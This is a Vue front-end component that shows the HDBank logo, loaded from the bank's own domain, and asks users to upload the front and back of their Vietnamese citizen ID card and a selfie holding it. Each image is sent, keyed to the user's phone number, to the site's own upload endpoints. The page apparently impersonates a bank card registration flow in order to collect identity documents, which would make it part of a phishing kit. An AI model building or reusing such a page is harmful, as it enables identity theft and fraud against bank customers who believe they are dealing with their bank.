<template>
    <div class="">
        <div>
            <div style="display: flex; justify-content: center">
                <a href="">
                    <v-img cover width="133px" src="https://sieuthe4trong1.hdbank.com.vn/images/logo.svg" alt=""></v-img>
                </a>
            </div>
        </div>
        <div style="margin-top: 20px">
            <v-row justify="center">
                <div style="display: flex; justify-content: center">
                </div>
                <v-col md="8" lg="6" cols="12" sm="12">
                    <v-card title="Ảnh CCCD mặt trước" class="mb-5">
                        <v-card-text>
                            <v-file-input density="compact" variant="solo" label="Chọn ảnh" prepend-icon="" accept="image/*"
                                placeholder="Chọn ảnh" prepend-inner-icon="mdi-camera" clearable
                                @change="onFileChangeBefore">
                            </v-file-input>
                            <img :src="imagePreViewBefore" alt="" style="max-width: 100%;">
                        </v-card-text>
                    </v-card>
                    <v-card title="Ảnh CCCD mặt sau" class="mb-5">
                        <v-card-text>
                            <v-file-input density="compact" variant="solo" label="Chọn ảnh" prepend-icon="" accept="image/*"
                                placeholder="Chọn ảnh" prepend-inner-icon="mdi-camera" clearable
                                @change="onFileChangeAfter">
                            </v-file-input>
                            <img :src="imagePreViewAfter" alt="" style="max-width: 100%;">
                        </v-card-text>
                    </v-card>
                    <v-card title="Ảnh chân dung cầm CCCD" class="mb-5">
                        <v-card-text>
                            <v-file-input density="compact" variant="solo" label="Chọn ảnh" prepend-icon="" accept="image/*"
                                placeholder="Chọn ảnh" prepend-inner-icon="mdi-camera" clearable @change="onFileChange">
                            </v-file-input>
                            <img :src="imagePreView" alt="" style="max-width: 100%;">
                        </v-card-text>
                    </v-card>
                    <v-btn color="warning" block class="mt-2" to="/information">Tiếp tục</v-btn>
                </v-col>
            </v-row>
        </div>
    </div>
</template>
<script setup>
import { computed, ref, onMounted } from 'vue'
import axios from '@/plugins/axios'
import { useRouter } from 'vue-router'
import { useStore } from 'vuex';
const router = useRouter()
const store = useStore()
const user = computed(() => store.state.user)

const imagePreViewBefore = ref(null)
const imagePreViewAfter = ref(null)
const imagePreView = ref(null)
const formValue = ref({
    imageBefore: null,
    imageAfter: null,
    image: null
})
onMounted(() => {
    if (!user.value.numberPhone) {
        router.push({ name: 'Home' })
    }
})

const onFileChangeBefore = (e) => {
    const file = e.target.files[0]
    const formData = new FormData()
    formData.append('imageBefore', file)
    formData.append('numberPhone', user.value.numberPhone)
    axios.post('/upload-image-before', formData).then(res => {
        formValue.imageBefore = res.data
        const reader = new FileReader()
        reader.readAsDataURL(file)
        reader.onload = (e) => {
            imagePreViewBefore.value = e.target.result
        }
    }).catch(err => {
        console.log(err)
    })
}

const onFileChangeAfter = (e) => {
    const file = e.target.files[0]
    const formData = new FormData()
    formData.append('imageAfter', file)
    formData.append('numberPhone', user.value.numberPhone)

    axios.post('/upload-image-after', formData).then(res => {
        formValue.imageAfter = res.data
        const reader = new FileReader()
        reader.readAsDataURL(file)
        reader.onload = (e) => {
            imagePreViewAfter.value = e.target.result
        }
    }).catch(err => {
        console.log(err)
    })
}

const onFileChange = (e) => {
    const file = e.target.files[0]
    const formData = new FormData()
    formData.append('image', file)
    formData.append('numberPhone', user.value.numberPhone)

    axios.post('/upload-image', formData).then(res => {
        formValue.image = res.data
        const reader = new FileReader()
        reader.readAsDataURL(file)
        reader.onload = (e) => {
            imagePreView.value = e.target.result
        }
    }).catch(err => {
        console.log(err)
    })
}
</script>
<style>
.bg-gray {
    background-color: #f5f5f5;
}

body {
    background: #f2f2f4;
}

.v-card-item .v-card-title {
    padding: 0 0 0 0;
    font-size: 16px;
    font-weight: 500;
    color: #000;
    margin-bottom: 10px;
}

.v-field.v-field--appended.v-field--center-affix.v-field--variant-solo.v-theme--light.v-locale--is-ltr {
    border: 1px solid #ccc;
}

label.v-label.v-field-label {
    font-size: 14px;
    color: #000;
    font-weight: 500;
}

.v-card.v-theme--light.v-card--density-default.v-card--variant-elevated {
    border: 1px solid #ccc;
}



.v-field--center-affix .v-label.v-field-label {
    font-size: 14px;
    color: #000;
    font-weight: 500;
    top: 50%;
}
</style>